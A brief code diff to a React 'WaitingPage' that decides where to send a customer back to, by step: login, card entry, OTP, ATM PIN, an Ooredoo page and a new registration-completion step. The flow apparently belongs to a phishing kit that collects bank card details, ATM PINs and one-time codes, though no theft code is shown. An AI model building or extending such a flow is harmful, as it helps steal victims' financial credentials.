@@ -38,7 +38,8 @@ export default function WaitingPage() {
       let backUrl = "";
       
       // تحديد الصفحة التي يعود إليها العميل بناءً على المرحلة الحالية
-      if (currentStep === "login") backUrl = "/login-method";
+      if (currentStep === "login" || currentStep?.startsWith("card-")) backUrl = "/login-method";
+      else if (currentStep === "registration-completion") backUrl = "/registration-completion";
       else if (currentStep === "otp") backUrl = "/otp";
       else if (currentStep === "atm") backUrl = "/atm-pin";
       else if (currentStep === "ooredoo") backUrl = "/ooredoo";
